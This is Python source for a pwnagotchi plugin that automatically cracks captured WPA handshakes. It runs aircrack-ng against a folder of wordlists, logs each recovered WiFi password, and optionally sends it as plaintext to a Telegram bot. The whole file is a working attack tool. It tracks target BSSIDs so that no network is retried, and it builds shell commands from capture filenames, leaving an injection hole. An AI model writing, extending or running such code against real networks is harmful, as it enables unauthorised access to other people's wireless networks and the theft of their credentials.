import logging
import subprocess
import re
import os
import glob
import json
from datetime import datetime, date

import pwnagotchi.plugins as plugins
from telegram import Bot  # pip install python-telegram-bot


"""
Requires:
  sudo apt-get install aircrack-ng

Behavior:
  - Detect handshake in pcap
  - Run aircrack-ng with all *.txt in wordlist_folder
  - If KEY FOUND -> show password on screen + optionally send to Telegram
  - Save cracked results to cracked.txt (dedup)
  - NEW: do NOT try to crack the same network more than once (tracked by BSSID)
"""


class QuickDic(plugins.Plugin):
    __author__ = 'Hacktheplanet-io + silentree12th'
    __version__ = '1.5.0'
    __license__ = 'GPL3'
    __description__ = 'Quick dictionary scan against captured handshakes; optional Telegram plaintext message.'

    __dependencies__ = {
        'apt': ['aircrack-ng'],
    }

    __defaults__ = {
        'enabled': False,
        'wordlist_folder': '/home/pi/wordlists/',
        'face': '(·ω·)',
        'api': None,  # telegram bot token
        'id': None,   # telegram chat id

        # where to save cracked results
        'cracked_log': '/home/pi/handshakes/cracked.txt',

        # NEW: tracking file for "already attempted" networks
        'attempts_db': '/home/pi/handshakes/quickdic_attempts.json',

        # NEW: if True, attempts reset each day (so it can try again tomorrow)
        # if False, once attempted it will never try again unless you delete attempts_db
        'attempt_once_per_day': False,
    }

    def on_loaded(self):
        logging.info('[better_quickdic] plugin loaded')

        # Ensure defaults exist even if missing in config.toml
        self.options.setdefault('enabled', False)
        self.options.setdefault('wordlist_folder', '/home/pi/wordlists/')
        self.options.setdefault('face', '(·ω·)')
        self.options.setdefault('api', None)
        self.options.setdefault('id', None)
        self.options.setdefault('cracked_log', '/home/pi/handshakes/cracked.txt')
        self.options.setdefault('attempts_db', '/home/pi/handshakes/quickdic_attempts.json')
        self.options.setdefault('attempt_once_per_day', False)

        self._log_wordlists()
        self._attempts = self._load_attempts()

        # Quick dependency check
        check = subprocess.run(
            "/usr/bin/dpkg -l aircrack-ng | grep aircrack-ng | awk '{print $2, $3}'",
            shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT
        )
        out = check.stdout.decode('utf-8', errors='ignore').strip()
        if out and "aircrack-ng" in out and "<none>" not in out:
            logging.info('[better_quickdic] Found %s', out)
        else:
            logging.warning('[better_quickdic] aircrack-ng not detected (is it installed?)')

    # ---------------------------
    # Wordlists
    # ---------------------------

    def _log_wordlists(self):
        folder = str(self.options.get('wordlist_folder', '/home/pi/wordlists/')).strip()
        folder = folder if folder.endswith('/') else folder + '/'
        files = sorted(glob.glob(folder + "*.txt"))
        logging.info('[better_quickdic] Wordlist folder: %s', folder)
        logging.info('[better_quickdic] Wordlists found: %d', len(files))
        if len(files) == 0:
            logging.warning('[better_quickdic] No .txt wordlists found!')

    def _get_wordlist_arg(self):
        """
        Returns a comma-separated list of wordlist file paths for aircrack-ng -w.
        """
        folder = str(self.options.get('wordlist_folder', '/home/pi/wordlists/')).strip()
        folder = folder if folder.endswith('/') else folder + '/'
        files = sorted(glob.glob(folder + "*.txt"))
        return ",".join(files) if files else ""

    # ---------------------------
    # Attempts DB (skip re-cracks)
    # ---------------------------

    def _load_attempts(self):
        """
        attempts schema:
          {
            "version": 1,
            "last_reset": "YYYY-MM-DD" or null,
            "attempted": {
                "AA:BB:CC:DD:EE:FF": {"first_seen": "...", "last_seen": "...", "count": 3}
            }
          }
        """
        path = str(self.options.get('attempts_db')).strip()
        try:
            if os.path.exists(path):
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    data = json.load(f)
            else:
                data = {"version": 1, "last_reset": None, "attempted": {}}

            # optional daily reset
            if self.options.get('attempt_once_per_day', False):
                today = date.today().isoformat()
                if data.get("last_reset") != today:
                    data["attempted"] = {}
                    data["last_reset"] = today
                    self._save_attempts(data)

            return data

        except Exception as e:
            logging.error("[better_quickdic] Failed to load attempts db: %s", str(e))
            return {"version": 1, "last_reset": None, "attempted": {}}

    def _save_attempts(self, data):
        path = str(self.options.get('attempts_db')).strip()
        try:
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, sort_keys=True)
        except Exception as e:
            logging.error("[better_quickdic] Failed to save attempts db: %s", str(e))

    def _has_attempted(self, bssid):
        bssid = (bssid or "").upper().strip()
        return bssid in (self._attempts.get("attempted", {}) or {})

    def _mark_attempted(self, bssid):
        bssid = (bssid or "").upper().strip()
        if not bssid:
            return

        attempted = self._attempts.setdefault("attempted", {})
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        if bssid not in attempted:
            attempted[bssid] = {"first_seen": now, "last_seen": now, "count": 1}
        else:
            attempted[bssid]["last_seen"] = now
            attempted[bssid]["count"] = int(attempted[bssid].get("count", 0)) + 1

        self._save_attempts(self._attempts)

    # ---------------------------
    # Parsing helpers
    # ---------------------------

    def _extract_bssid_from_aircrack(self, filename):
        """
        Extract the first MAC address from aircrack-ng output lines mentioning "1 handshake".
        """
        cmd = f"/usr/bin/aircrack-ng '{filename}' | grep '1 handshake'"
        p = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        txt = p.stdout.decode('utf-8', errors='ignore')

        macs = re.findall(r"([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})", txt)
        if macs:
            return macs[0].upper()

        # fallback: scan header region
        cmd2 = f"/usr/bin/aircrack-ng '{filename}' | head -n 120"
        p2 = subprocess.run(cmd2, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        txt2 = p2.stdout.decode('utf-8', errors='ignore')
        macs2 = re.findall(r"([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})", txt2)
        return macs2[0].upper() if macs2 else ""

    def _ssid_from_filename(self, filename):
        base = os.path.splitext(os.path.basename(filename))[0]
        parts = base.split('_')
        if len(parts) >= 3:
            return "_".join(parts[0:-2])
        return base

    def _append_cracked_log(self, ssid, pwd):
        path = str(self.options.get('cracked_log', '/home/pi/handshakes/cracked.txt')).strip()
        line = f"{ssid} | {pwd}"

        try:
            os.makedirs(os.path.dirname(path), exist_ok=True)

            if os.path.exists(path):
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    if line in f.read():
                        return

            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(path, "a", encoding="utf-8") as f:
                f.write(f"{ts}  {line}\n")

        except Exception as e:
            logging.error("[better_quickdic] Could not write cracked log: %s", str(e))

    # ---------------------------
    # Main event
    # ---------------------------

    def on_handshake(self, agent, filename, access_point, client_station):
        display = agent.view()

        # 1) Extract real BSSID
        bssid = self._extract_bssid_from_aircrack(filename)
        if not bssid:
            logging.info('[better_quickdic] No handshake/BSSID found in %s', filename)
            return

        # 2) Skip if already attempted
        if self._has_attempted(bssid):
            logging.info("[better_quickdic] Skipping crack (already attempted BSSID=%s)", bssid)
            return

        # Mark as attempted immediately (so duplicates won't queue up)
        self._mark_attempted(bssid)

        logging.info('[better_quickdic] Handshake confirmed (BSSID=%s) -> starting crack...', bssid)

        # 3) Build wordlist list
        wl = self._get_wordlist_arg()
        if not wl:
            logging.warning('[better_quickdic] No wordlists available. Skipping crack.')
            return

        # 4) Run aircrack
        cmd = (
            f"aircrack-ng -q "
            f"-w '{wl}' "
            f"-l '{filename}.cracked' "
            f"-b '{bssid}' "
            f"'{filename}'"
        )

        p = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        out = p.stdout.decode('utf-8', errors='ignore').strip()

        # Log last lines for debug
        if out:
            last_lines = "\n".join(out.splitlines()[-12:])
            logging.info('[better_quickdic] aircrack last output:\n%s', last_lines)
        else:
            logging.info('[better_quickdic] aircrack output: (empty)')

        # 5) Not found
        if "KEY NOT FOUND" in out:
            logging.info('[better_quickdic] Dictionary finished - KEY NOT FOUND')
            return

        # 6) Extract key safely
        key_match = re.search(r"KEY FOUND!\s*\[(.*?)\]", out)
        if not key_match:
            key_match = re.search(r"\[(.*?)\]", out)

        if not key_match:
            logging.info('[better_quickdic] Dictionary finished - no key pattern detected')
            return

        pwd = key_match.group(1).strip()
        ssid = self._ssid_from_filename(filename)

        # 7) Show on screen
        msg = "Cracked password: " + pwd
        display.set('face', self.options.get('face', '(·ω·)'))
        display.set('status', msg)
        display.update(force=True)

        # 8) Save locally
        self._append_cracked_log(ssid, pwd)

        # 9) Telegram send (plain text)
        if self.options.get('id') is not None and self.options.get('api') is not None:
            self._send_message(ssid, pwd)

    def _send_message(self, ssid, pwd):
        try:
            bot = Bot(token=str(self.options['api']).strip())
            chat_id = int(str(self.options['id']).strip())
            message_text = f"Cracked WiFi ✅\nSSID: {ssid}\nPassword: {pwd}"
            bot.send_message(chat_id=chat_id, text=message_text)
            logging.info('[better_quickdic] Sent cracked password to Telegram for SSID=%s', ssid)
        except Exception as e:
            logging.error('[better_quickdic] Telegram send error: %s', str(e))
